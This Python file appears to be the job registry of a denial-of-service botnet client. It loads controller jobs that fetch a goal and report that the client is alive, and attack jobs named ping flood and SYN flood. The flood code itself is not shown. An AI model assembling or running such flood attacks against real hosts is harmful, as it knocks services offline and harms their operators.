print("jobs_registry: Started initialization")

from jobs.job_controller_get_goal import JobControllerGetGoal
JOB_CONTROLLER_GET_GOAL = JobControllerGetGoal()

from jobs.job_controller_notify_alive import JobControllerNotifyAlive
JOB_CONTROLLER_NOTIFY_ALIVE = JobControllerNotifyAlive()

from jobs.job_attack_ping_flood import JobAttackPingFlood
JOB_ATTACK_PING_FLOOD = JobAttackPingFlood()

from jobs.job_attack_syn_flood import JobAttackSynFlood
JOB_ATTACK_SYN_FLOOD = JobAttackSynFlood()

print("jobs_registry: Finished initialization")
